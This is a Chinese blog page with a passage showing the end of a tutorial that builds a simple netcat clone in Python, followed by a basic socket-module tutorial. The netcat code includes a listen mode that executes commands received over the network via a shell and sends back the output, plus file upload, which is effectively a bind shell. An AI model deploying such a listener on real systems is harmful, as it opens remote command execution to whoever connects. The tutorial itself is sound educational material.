<figure class="highlight sql"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">def _init_args_parser(self):</div><div class="line">        self.parser.add_argument('-l', <span class="keyword">help</span>=<span class="string">'listen mode'</span>, <span class="keyword">required</span>=<span class="literal">False</span>, <span class="keyword">action</span>=<span class="string">'store_true'</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-e'</span>, <span class="keyword">help</span>=<span class="string">'execute command'</span>, <span class="keyword">required</span>=<span class="literal">False</span>, <span class="keyword">action</span>=<span class="string">'store_true'</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-a'</span>, <span class="keyword">help</span>=<span class="string">'address'</span>, <span class="keyword">required</span>=<span class="literal">False</span>, <span class="keyword">default</span>=<span class="string">'127.0.0.1'</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-p'</span>, <span class="keyword">type</span>=<span class="built_in">int</span>, <span class="keyword">help</span>=<span class="string">'port'</span>, <span class="keyword">required</span>=<span class="literal">False</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-u'</span>, <span class="keyword">help</span>=<span class="string">'upload file'</span>, <span class="keyword">required</span>=<span class="literal">False</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-c'</span>, <span class="keyword">help</span>=<span class="string">'client mode'</span>, <span class="keyword">required</span>=<span class="literal">False</span>, <span class="keyword">action</span>=<span class="string">'store_true'</span>)</div><div class="line">        self.parser.add_argument(<span class="string">'-f'</span>, <span class="keyword">help</span>=<span class="string">'select file upload'</span>, <span class="keyword">required</span>=<span class="literal">False</span>)</div></pre></td></tr></table></figure>
<p>这是具体的参数设置，<code>-l</code>表示参数前缀，<code>help</code>指定帮助display字段，required表示字段是否必须， <code>action=&#39;store_true&#39;</code>表示只要有前缀就返回<code>True</code>。其他字段以此类推。</p>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">listen_mode</span><span class="params">(<span class="keyword">self</span>)</span></span>:</div><div class="line">       address = <span class="keyword">self</span>.args.a</div><div class="line">       port = <span class="keyword">self</span>.args.p</div><div class="line">       <span class="keyword">if</span> <span class="keyword">not</span> port <span class="keyword">or</span> <span class="keyword">not</span> <span class="symbol">address:</span></div><div class="line">           print(<span class="string">'not port or address'</span>)</div><div class="line">       <span class="symbol">else:</span></div><div class="line">           server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">           server_socket.bind((address, port))</div><div class="line"></div><div class="line">           server_socket.listen(<span class="number">1</span>)</div><div class="line"></div><div class="line">           <span class="keyword">while</span> <span class="symbol">True:</span></div><div class="line">               client_socket, addr = server_socket.accept()</div><div class="line">               <span class="keyword">self</span>.client_socket = client_socket</div><div class="line">               <span class="keyword">self</span>.server_handler()</div></pre></td></tr></table></figure>
<p>监听模式，首先从命令行参数当中获取地址和端口，然后通过socket进行绑定。绑定后调用<code>accept</code>建立连接。然后将<code>client_socket</code>赋予到类变量当中。后续动作则交由<code>server_handler()</code>处理。</p>
<figure class="highlight oxygene"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line">def server_handler(<span class="keyword">self</span>):</div><div class="line">        <span class="keyword">if</span> <span class="keyword">self</span>.client_socket:</div><div class="line">            <span class="keyword">if</span> <span class="keyword">self</span>.args.e:</div><div class="line">                <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                    cmd_buffer = <span class="keyword">self</span>.get_client_input_buffer()</div><div class="line">                    response = <span class="keyword">self</span>.run_command(cmd_buffer)</div><div class="line">                    <span class="keyword">self</span>.client_socket.send(response)</div><div class="line">            elif <span class="keyword">self</span>.args.u:</div><div class="line">                <span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">                    <span class="keyword">try</span>:</div><div class="line">                        file_buffer = <span class="keyword">self</span>.get_client_input_buffer()</div><div class="line">                        file_buffer = file_buffer.decode(<span class="string">'utf-8'</span>)</div><div class="line">                        dest = <span class="keyword">self</span>.args.u</div><div class="line">                        <span class="keyword">with</span> open(dest, <span class="string">'a'</span>) <span class="keyword">as</span> f:</div><div class="line">                            f.write(file_buffer)</div><div class="line">                            f.close()</div><div class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</div><div class="line">                        err_message = traceback.format_exc()</div><div class="line">                        err_message.encode(<span class="string">'utf-8'</span>)</div><div class="line">                        <span class="keyword">self</span>.client_socket.send(err_message)</div></pre></td></tr></table></figure>
<p>如果存在e参数，则为执行命令模式。从客户端接收命令，然后调用<code>run_command()</code>处理。如果存在u参数，则为文件上传模式，从客户端接收文件，定义文件路径（包括文件名），然后写入。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">run_command</span><span class="params">(self, command)</span>:</span></div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            output = subprocess.check_output(command, stderr=subprocess.STDOUT, shell=<span class="keyword">True</span>)</div><div class="line">            <span class="keyword">return</span> output</div><div class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> err:</div><div class="line">            error_message = traceback.format_exc()</div><div class="line">            <span class="keyword">return</span> error_message.encode(<span class="string">'utf-8'</span>)</div></pre></td></tr></table></figure>
<p>这里执行命令，调用了subprocess模块的check_output方法，第一个参数为执行的命令。</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div></pre></td><td class="code"><pre><div class="line">def client_mode(<span class="keyword">self</span>):</div><div class="line">        address = <span class="keyword">self</span>.args.a</div><div class="line">        port = <span class="keyword">self</span>.args.p</div><div class="line">        <span class="keyword">try</span>:</div><div class="line">            server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)</div><div class="line">            server_socket.connect((address, port))</div><div class="line">        except <span class="keyword">Exception</span> <span class="keyword">as</span> err:</div><div class="line">            <span class="keyword">print</span>(err)</div><div class="line">            <span class="keyword">return</span> <span class="number">0</span></div><div class="line">        <span class="keyword">self</span>.server_socket = server_socket</div><div class="line">        <span class="keyword">self</span>.client_handler()</div></pre></td></tr></table></figure>
<figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">client_handler</span><span class="params">(<span class="keyword">self</span>)</span></span>:</div><div class="line">        <span class="keyword">if</span> <span class="keyword">self</span>.args.<span class="symbol">f:</span></div><div class="line">            file_name = <span class="keyword">self</span>.args.f</div><div class="line">            file_buffer = <span class="string">''</span></div><div class="line">            with open(file_name, <span class="string">'r'</span>) as <span class="symbol">f:</span></div><div class="line">                <span class="keyword">for</span> line <span class="keyword">in</span> <span class="symbol">f:</span></div><div class="line">                    file_buffer += line</div><div class="line">                file_buffer.encode(<span class="string">'utf-8'</span>)</div><div class="line">                f.close()</div><div class="line">            <span class="keyword">self</span>.server_socket.send(file_buffer.encode(<span class="string">'utf-8'</span>))</div><div class="line">        elif <span class="keyword">self</span>.args.<span class="symbol">e:</span></div><div class="line">        	<span class="keyword">while</span> <span class="symbol">True:</span></div><div class="line">            	cmd = input()</div><div class="line">            	<span class="keyword">self</span>.server_socket.send(cmd.encode(<span class="string">'utf-8'</span>))</div><div class="line">            	data = <span class="keyword">self</span>.server_socket.recv(<span class="number">1024</span>)</div><div class="line">            	print(data.decode(<span class="string">'utf-8'</span>))</div></pre></td></tr></table></figure>
<p>客户端的实现也是类似，理解应该不是问题。</p>
<figure class="highlight subunit"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">test </span>= netcat()</div></pre></td></tr></table></figure>
<p>当然，当然，最后，还得调用一下。<br>至此，一个相当的简陋的netcat算是完工了，我们跑起来测试一下。<br><img src="/images/netcat/netcat.png" alt="测试截图"></p>
<p>提醒一下，py3当中socket不管收发都是用的bytes而非str，所以编写的时候要注意了。<br>代码还有很多问题，并且功能非常简陋，这个只是作为demo展示。如果你有更好的想法，欢迎在我的<a href="https://github.com/Dollarsss/netcat" target="_blank" rel="external">github</a>上留言。(别太care头像..)<br>最后，这段代码的思路参考了《python黑帽子：黑客与渗透测试编程之道》，目前中文版好像没有电子版，大家有兴趣可以买来阅读，当然，英语好的直接阅读原版就好。</p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
      

  

  
  
  

  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
  
  
  
  <div class="post-block">
    <link itemprop="mainEntityOfPage" href="http://dinfinite.cn/2017/06/25/python中socket模块的使用/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="name" content="D_infinite">
      <meta itemprop="description" content="">
      <meta itemprop="image" content="/images/avatar.gif">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="D_infinite的小站">
    </span>

    
      <header class="post-header">

        
        
          <h1 class="post-title" itemprop="name headline">
                
                <a class="post-title-link" href="/2017/06/25/python中socket模块的使用/" itemprop="url">python中socket模块的使用</a></h1>
        

        <div class="post-meta">
          <span class="post-time">
            
              <span class="post-meta-item-icon">
                <i class="fa fa-calendar-o"></i>
              </span>
              
                <span class="post-meta-item-text">发表于</span>
              
              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-06-25T17:21:37+08:00">
                2017-06-25
              </time>
            

            

            
          </span>

          
            <span class="post-category" >
            
              <span class="post-meta-divider">|</span>
            
              <span class="post-meta-item-icon">
                <i class="fa fa-folder-o"></i>
              </span>
              
                <span class="post-meta-item-text">分类于</span>
              
              
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/python/" itemprop="url" rel="index">
                    <span itemprop="name">python</span>
                  </a>
                </span>

                
                
              
            </span>
          

          
            
          

          
          

          

          

          

        </div>
      </header>
    

    
    
    
    <div class="post-body" itemprop="articleBody">

      
      

      
        
          
            <h4 id="0x01-原理"><a href="#0x01-原理" class="headerlink" title="0x01 原理"></a>0x01 原理</h4><p>在python安全编程的世界当中，socket是和requests并驾齐驱，必须要掌握的一个模块。因为应用层上除了WEB的行为，你基本上都要使用socket去完成。<br><img src="http://static.oschina.net/uploads/space/2014/1103/154553_SGq0_1378445.jpg?_=5730135" alt=""><br>那么什么是socket呢？简单来说，就是区分同一服务器上不同应用程序的标识。其目的是为了完成从A主机上X进程到B主机上Y进程的通信。因此socket是工作在应用层和传输层之间的。如果你对什么是socket，什么是TCP,UDP不了解，建议阅读<a href="http://www.cnblogs.com/hissia/p/5730135.html" target="_blank" rel="external">这篇文章</a>，如果你从来没学过计算机网络，则请阅读<a href="http://blog.csdn.net/yaopeng_2005/article/details/7064869" target="_blank" rel="external">这篇文章</a>。</p>
<p>注意，socket和socket模块是不一样的，这篇文章主要介绍socket模块的使用。</p>
<h4 id="0x02-使用"><a href="#0x02-使用" class="headerlink" title="0x02 使用"></a>0x02 使用</h4><p>先让我们来看一个小小的Demo</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import <span class="built_in">socket</span></div><div class="line"></div><div class="line"></div><div class="line">s = <span class="built_in">socket</span>.<span class="built_in">socket</span>(<span class="built_in">socket</span>.AF_INET, <span class="built_in">socket</span>.SOCK_STREAM)</div></pre></td></tr></table></figure>
<p>首先socket.socket是一个类，我们将其实例化之后传递给s，而实例化的参数如下：</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">socket.socket(<span class="attr">family=AF_INET,</span> <span class="attr">type=SOCK_STREAM,</span> <span class="attr">proto=0,</span> <span class="attr">fileno=None)</span></div></pre></td></tr></table></figure>
<p>family用于指定套接族，type用于指定套接类型，proto用于指定协议。</p>
<table>
<thead>
<tr>
<th style="text-align:left">family</th>
<th style="text-align:right">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">AF_UNIX</td>
<td style="text-align:right">unix系统本地通信</td>
</tr>
<tr>
<td style="text-align:left">AF_INET</td>
<td style="text-align:right">ipv4通信</td>
</tr>
<tr>
<td style="text-align:left">AF_INET6</td>
<td style="text-align:right">ipv6通信</td>
</tr>
</tbody>
</table>
<table>
<thead>
<tr>
<th style="text-align:left">type</th>
<th style="text-align:right">含义</th>
</tr>
</thead>
<tbody>
<tr>
<td style="text-align:left">SOCK_STREAM</td>
<td style="text-align:right">基于TCP的流式socket通信</td>
</tr>
<tr>
<td style="text-align:left">SOCK_DGRAM</td>
<td style="text-align:right">基于UDP的数据包式通信</td>
</tr>
<tr>
<td style="text-align:left">SOCK_RAW</td>
<td style="text-align:right">原始套接字</td>
</tr>
</tbody>
</table>
<p>以上只是一部分，更多细节请参考官方手册。<br>完成初始化之后，就可以调用socket类的方法了。</p>
<figure class="highlight lsl"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s.connect(('<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>', <span class="number">12345</span>))</div></pre></td></tr></table></figure>
<p>在上面的demo当中，调用了connect方法。该方法传入一个address参数，该参数为元组形式，包括地址以及端口。意思就是建立连接，只有建立连接之后才能有后续动作。<br>(注：python3.5之后该方法超时不再引发InterruptedError)</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="built_in">while</span> True:</div><div class="line">	<span class="built_in">text</span> = input(<span class="string">'please input...'</span>)</div><div class="line">	<span class="built_in">print</span>()</div><div class="line">	s.send(<span class="built_in">text</span>.encode(<span class="string">'ascii'</span>))</div><div class="line">	data = s.recv(<span class="number">1024</span>)</div><div class="line">	<span class="built_in">print</span>(data.decode(<span class="string">'ascii'</span>))</div></pre></td></tr></table></figure>
<p>recv方法传入一个bufsize参数，指定接收内容的大小。执行成功返回bytes对象。<br>send则是相反，发送一个bytes对象到对应客户端。因此，发送或接收时注意不要发送str对象，而应发送bytes对象。<br>(注：在python2中则为发送接收str对象)</p>
<p>接下来开始服务器端的编写</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">import <span class="built_in">socket</span></div><div class="line"></div><div class="line">s = <span class="built_in">socket</span>.<span class="built_in">socket</span>(<span class="built_in">socket</span>.AF_INET, <span class="built_in">socket</span>.SOCK_STREAM)</div><div class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">12345</span>))</div></pre></td></tr></table></figure>
<p>这里调用了bind方法。作用在于绑定主机地址和端口号，建立一个服务端的socket进程。<br>（注：这里如果写localhost或是127.0.0.1只能本机访问，如果需要让别的主机访问，可以使用<code>socket.gethostname()</code>。）</p>
<figure class="highlight gradle"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">	conn, addr = s.accept()</div><div class="line">	<span class="keyword">print</span>(<span class="string">'connected by '</span>,addr)</div><div class="line">	<span class="keyword">while</span> <span class="keyword">True</span>:</div><div class="line">		data = conn.recv(<span class="number">1024</span>)</div><div class="line">		<span class="keyword">print</span>(data.decode(<span class="string">'ascii'</span>))</div><div class="line">		conn.send(b<span class="string">'server received you message'</span>)</div></pre></td></tr></table></figure>
<p>accept的方法是接受客户端发起的connect请求，该方法返回一个元组，包含一个新的socket对象以及地址对。在后续阶段，将使用这个新的socket对象与客户端进行交互。</p>
<figure class="highlight arduino"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s.<span class="built_in">close</span>()</div></pre></td></tr></table></figure>
<p>最后，在使用完成之后，记得关闭套接字。<br>至此，一个基本的通过socket通信的程序已经基本完成。</p>
<h4 id="0x03-补充"><a href="#0x03-补充" class="headerlink" title="0x03 补充"></a>0x03 补充</h4><p>如果你还对socket的实际应用不太了解，建议多阅读<a href="https://www.exploit-db.com/" target="_blank" rel="external">exploit-db</a>上面的一些EXP，相当多都用到了socket。<br>如前阵子的<a href="https://www.exploit-db.com/exploits/42031/" target="_blank" rel="external">永恒之蓝</a>，又如14年臭名昭著的<a href="https://www.exploit-db.com/exploits/32745/" target="_blank" rel="external">心脏滴血</a>。</p>
<p>当然socket的用途绝不仅限于编写EXP，但是通过阅读EXP，理解socket的本质，做到举一反三，对你非常有帮助。</p>
<p>如果你对socket的一些细节用法不太了解，请手动查阅官方文档。</p>
<h4 id="0x04-参考"><a href="#0x04-参考" class="headerlink" title="0x04 参考"></a>0x04 参考</h4><p><a href="https://gist.github.com/kevinkindom/108ffd675cb9253f8f71" target="_blank" rel="external">python-socket详细介绍</a></p>
<p><a href="https://docs.python.org/3/library/socket.html" target="_blank" rel="external">socket官方文档(3.5)</a></p>
<p><a href="https://docs.python.org/2/howto/sockets.html" target="_blank" rel="external">基于python2的官方tutorial</a></p>

          
        
      
    </div>
    
    
    

    

    

    

    <footer class="post-footer">
      

      

      

      
      
        <div class="post-eof"></div>
      
    </footer>
  </div>
  
  
  
  </article>


    
  </section>

  
  <nav class="pagination">
    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
  </nav>



          </div>
          


          

        </div>
        
          
  
  <div class="sidebar-toggle">
    <div class="sidebar-toggle-line-wrap">
      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
    </div>
  </div>

  <aside id="sidebar" class="sidebar">
    
    <div class="sidebar-inner">

      

      

      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
        <div class="site-overview">
          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
            
              <p class="site-author-name" itemprop="name">D_infinite</p>
              <p class="site-description motion-element" itemprop="description"></p>
          </div>

          <nav class="site-state motion-element">

            
              <div class="site-state-item site-state-posts">
              
                <a href="/archives/">
              
                  <span class="site-state-item-count">22</span>
                  <span class="site-state-item-name">日志</span>
                </a>
              </div>
            

            
              
              
              <div class="site-state-item site-state-categories">
                
                  <span class="site-state-item-count">7</span>
                  <span class="site-state-item-name">分类</span>
                
              </div>
            

            
              
              
              <div class="site-state-item site-state-tags">
                
                  <span class="site-state-item-count">2</span>
                  <span class="site-state-item-name">标签</span>
                
              </div>
            

          </nav>

          

          

          
          

          
          

          

        </div>
      </section>

      

      

    </div>
  </aside>


        
      </div>
    </main>

    <footer id="footer" class="footer">
      <div class="footer-inner">
        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
  <span class="with-love">
    <i class="fa fa-user"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">D_infinite</span>

  
</div>


  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>



  <span class="post-meta-divider">|</span>



  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Muse</a> v5.1.4</div>




        







        
      </div>
    </footer>

    
      <div class="back-to-top">
        <i class="fa fa-arrow-up"></i>
        
      </div>
    

    

  </div>

  

<script type="text/javascript">
  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
    window.Promise = null;
  }
</script>









  












  
  
    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
  

  
  
    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
  

  
  
    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
  

  
  
    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
  


  


  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>

  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>



  
  

  

  


  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>



  


  




	





  





  












  





  

  

  

  
  

  

  

  

</body>
</html>
